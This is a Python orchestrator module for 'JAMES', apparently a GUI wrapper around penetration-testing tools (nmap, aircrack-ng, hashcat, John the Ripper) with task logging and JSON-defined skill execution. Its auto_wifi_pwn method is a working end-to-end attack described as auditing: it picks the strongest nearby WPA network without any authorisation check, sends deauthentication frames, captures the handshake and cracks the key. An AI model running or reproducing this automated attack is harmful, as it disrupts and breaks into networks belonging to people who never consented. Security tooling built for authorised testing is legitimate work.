"""
JAMES Orchestrator.

Central coordinator that connects tool wrappers, the execution layer,
skill definitions, and the GUI. Maintains a task log and emits
signals the GUI can subscribe to.
"""

import json
import logging
import os
from datetime import datetime
from pathlib import Path
from typing import Optional

from james.layers.native import NativeLayer
from james.tools.parrot import Nmap, AircrackSuite, Hashcat, John

logger = logging.getLogger(__name__)

SKILLS_DIR = Path(__file__).resolve().parent.parent / "skills"


class TaskEntry:
    """Single entry in the task log."""

    def __init__(self, action: str, tool: str, params: dict):
        self.timestamp = datetime.now().isoformat()
        self.action = action
        self.tool = tool
        self.params = params
        self.result: Optional[dict] = None
        self.status = "pending"  # pending | running | done | error

    def as_dict(self) -> dict:
        return {
            "timestamp": self.timestamp,
            "action": self.action,
            "tool": self.tool,
            "params": self.params,
            "result": self.result,
            "status": self.status,
        }


class Orchestrator:
    """
    Top-level coordinator for JAMES.

    Attributes:
        layer:    NativeLayer instance
        nmap:     Nmap wrapper
        aircrack: AircrackSuite wrapper
        hashcat:  Hashcat wrapper
        john:     John wrapper
        task_log: ordered list of TaskEntry objects
    """

    def __init__(self):
        self.layer = NativeLayer()
        self.nmap = Nmap(self.layer)
        self.aircrack = AircrackSuite(self.layer)
        self.hashcat = Hashcat(self.layer)
        self.john = John(self.layer)
        self.task_log: list[TaskEntry] = []

        # callbacks the GUI can set to receive updates
        self.on_task_update: Optional[callable] = None
        self.on_print: Optional[callable] = None

    def _print(self, msg: str):
        logger.info(msg)
        if self.on_print:
            self.on_print(msg)

    # ── convenience actions ─────────────────────────────────────

    def system_check(self) -> dict:
        """Verify that required tools are installed."""
        tools = ["nmap", "aircrack-ng", "airmon-ng", "airodump-ng",
                 "aireplay-ng", "hashcat", "john", "iwconfig"]
        status = {}
        for t in tools:
            status[t] = self.layer.check_tool(t)
        return status

    def quick_recon(self, target: str) -> dict:
        """Run a fast nmap scan and log it."""
        entry = self._log("quick_recon", "nmap", {"target": target})
        result = self.nmap.quick_scan(target)
        self._finish(entry, result)
        return result

    def full_scan(self, target: str, ports: str = "1-65535") -> dict:
        entry = self._log("full_scan", "nmap", {"target": target, "ports": ports})
        result = self.nmap.scan(target, ports=ports, flags="-sV -sC", sudo=True, timeout=600)
        self._finish(entry, result)
        return result

    def wifi_interfaces(self) -> list[dict]:
        entry = self._log("wifi_interfaces", "aircrack", {})
        ifaces = self.aircrack.list_interfaces()
        self._finish(entry, {"interfaces": ifaces})
        return ifaces

    def start_monitor(self, interface: str) -> dict:
        entry = self._log("start_monitor", "aircrack", {"interface": interface})
        self.aircrack.check_kill()
        result = self.aircrack.enable_monitor(interface)
        self._finish(entry, result.as_dict())
        return result.as_dict()

    def stop_monitor(self, interface: str) -> dict:
        entry = self._log("stop_monitor", "aircrack", {"interface": interface})
        result = self.aircrack.disable_monitor(interface)
        self._finish(entry, result.as_dict())
        return result.as_dict()

    def crack_handshake(self, capture: str, wordlist: str, bssid: str = None) -> dict:
        entry = self._log("crack_handshake", "aircrack",
                          {"capture": capture, "wordlist": wordlist, "bssid": bssid})
        result = self.aircrack.crack_wpa(capture, wordlist, bssid=bssid)
        self._finish(entry, result)
        return result

    def crack_hash(self, hash_file: str, wordlist: str, mode: int = 0) -> dict:
        entry = self._log("crack_hash", "hashcat",
                          {"hash_file": hash_file, "wordlist": wordlist, "mode": mode})
        result = self.hashcat.crack(hash_file, wordlist, hash_mode=mode)
        self._finish(entry, result)
        return result

    # ── skills ──────────────────────────────────────────────────

    def load_skill(self, name: str) -> dict:
        """Load a JSON skill definition from the skills directory."""
        path = SKILLS_DIR / f"{name}.json"
        if not path.exists():
            return {"error": f"Skill '{name}' not found at {path}"}
        with open(path) as f:
            return json.load(f)

    def list_skills(self) -> list[str]:
        """Return names of available skill files."""
        if not SKILLS_DIR.exists():
            return []
        return [p.stem for p in SKILLS_DIR.glob("*.json")]

    def auto_wifi_pwn(self, interface: str, wordlist: str) -> dict:
        """
        Fully autonomous end-to-end Wi-Fi auditing workflow.
        Selects target, captures handshake, and cracks it.
        """
        import time
        from pathlib import Path
        
        self._print("[AUTOPWN] Starting autonomous Wi-Fi audit...")
        
        # 1. Prep
        self.aircrack.check_kill()
        mon_result = self.start_monitor(interface)
        mon_iface = f"{interface}mon" if not interface.endswith("mon") else interface
        
        # 2. Recon
        self._print("[AUTOPWN] Scanning for targets (15s)...")
        recon_prefix = "/tmp/james_recon"
        self.layer.run(f"rm -f {recon_prefix}*")
        
        proc = self.aircrack.start_airodump(mon_iface, write_prefix=recon_prefix)
        # We need to add --output-format csv manually or just let it write all.
        # Wait, the start_airodump wrapper doesn't pass --output-format csv.
        # But airodump-ng writes .csv by default anyway (recon_prefix-01.csv).
        time.sleep(15)
        self.layer.kill_background(proc)
        
        # 3. Target Selection
        csv_file = f"{recon_prefix}-01.csv"
        if not Path(csv_file).exists():
            self.stop_monitor(mon_iface)
            return {"error": "Failed to generate scan results."}
            
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            parsed = self.aircrack.parse_airodump_csv(f.read())
            
        # Filter WPA APs and sort by power
        aps = [ap for ap in parsed["aps"] if "WPA" in ap["privacy"]]
        if not aps:
            self.stop_monitor(mon_iface)
            return {"error": "No WPA networks found in range."}
            
        # Sort by power descending (power is usually negative, so we want the maximum value closest to 0)
        aps.sort(key=lambda x: x["power"], reverse=True)
        target = aps[0]
        
        self._print(f"[AUTOPWN] Selected Target: {target['bssid']} ({target['essid']}) on Channel {target['channel']}")
        
        # 4. Targeted Capture
        cap_prefix = "/tmp/james_capture"
        self.layer.run(f"rm -f {cap_prefix}*")
        
        cap_proc = self.aircrack.start_airodump(
            mon_iface, 
            channel=target["channel"], 
            bssid=target["bssid"], 
            write_prefix=cap_prefix
        )
        
        # 5. Deauth & Capture Loop
        self._print("[AUTOPWN] Initiating capture and deauth attacks...")
        handshake_found = False
        cap_file = f"{cap_prefix}-01.cap"
        
        for attempt in range(3):
            time.sleep(5) # Let it listen
            self.aircrack.deauth(mon_iface, target["bssid"], count=5)
            self._print(f"[AUTOPWN] Sent deauth frames (Attempt {attempt+1}/3)...")
            time.sleep(10) # Wait for re-association
            
            if Path(cap_file).exists() and self.aircrack.check_handshake(cap_file, target["bssid"]):
                handshake_found = True
                self._print("[AUTOPWN] Valid WPA handshake captured!")
                break
                
        # 6. Cleanup Capture
        self.layer.kill_background(cap_proc)
        self.stop_monitor(mon_iface)
        
        # 7. Cracking
        if not handshake_found:
            return {"error": "Failed to capture handshake within the timeout."}
            
        self._print(f"[AUTOPWN] Cracking handshake with {wordlist}...")
        result = self.crack_handshake(cap_file, wordlist, target["bssid"])
        
        if result.get("found"):
            self._print(f"[AUTOPWN] SUCCESS! Key found: {result['key']}")
            return {"success": True, "key": result["key"], "bssid": target["bssid"], "essid": target["essid"]}
        else:
            self._print("[AUTOPWN] Cracking finished: Key not in wordlist.")
            return {"success": False, "error": "Key not in wordlist."}

    def execute_skill_steps(self, skill: dict, context: dict):
        """Execute the steps of a skill sequentially using the provided context."""
        from james.layers.native import CommandResult

        self._print(f"[SKILL] Running: {skill.get('name', 'unknown')}")

        for step in skill.get("steps", []):
            action = step.get("action")
            params = {}
            for k, v in step.get("params", {}).items():
                if isinstance(v, str) and v.startswith("{{") and v.endswith("}}"):
                    var_name = v[2:-2].strip()
                    params[k] = context.get(var_name, v)
                elif isinstance(v, str):
                    # Also do inline {{var}} substitution within strings
                    import re
                    for match in re.finditer(r"\{\{(\w+)\}\}", v):
                        vname = match.group(1)
                        v = v.replace(match.group(0), context.get(vname, match.group(0)))
                    params[k] = v
                else:
                    params[k] = v
            
            try:
                if "." in action:
                    tool_name, method_name = action.split(".", 1)
                    if tool_name == "nmap":
                        target_obj = self.nmap
                    elif tool_name == "aircrack":
                        target_obj = self.aircrack
                    elif tool_name == "hashcat":
                        target_obj = self.hashcat
                    elif tool_name == "john":
                        target_obj = self.john
                    elif tool_name == "layer":
                        target_obj = self.layer
                    else:
                        target_obj = self
                else:
                    target_obj = self
                    method_name = action
                
                method = getattr(target_obj, method_name)
                
                # Log step start
                desc = step.get("description", action)
                self._print(f"  → [{step.get('id', '?')}] {desc}")
                entry = self._log(step.get("id", "step"), action, params)
                
                # Execute
                result = method(**params)
                
                # Convert CommandResult to dict for logging
                if isinstance(result, CommandResult):
                    result = result.as_dict()
                
                # Log finish
                self._finish(entry, result)
                
                if isinstance(result, dict) and "error" in result:
                    self._print(f"  ✕ Step failed: {result['error']}")
                    break
            except Exception as e:
                entry = self._log(step.get("id", "error"), action, params)
                self._finish(entry, {"error": str(e)})
                self._print(f"  ✕ Exception: {e}")
                break

        self._print(f"[SKILL] Finished: {skill.get('name', 'unknown')}")

    # ── task log internals ──────────────────────────────────────

    def _log(self, action: str, tool: str, params: dict) -> TaskEntry:
        entry = TaskEntry(action, tool, params)
        entry.status = "running"
        self.task_log.append(entry)
        if self.on_task_update:
            self.on_task_update(entry)
        logger.info("[task] %s → %s %s", action, tool, params)
        return entry

    def _finish(self, entry: TaskEntry, result) -> None:
        entry.result = result
        entry.status = "done" if not (isinstance(result, dict) and "error" in result) else "error"
        if self.on_task_update:
            self.on_task_update(entry)

    def export_log(self) -> list[dict]:
        return [e.as_dict() for e in self.task_log]
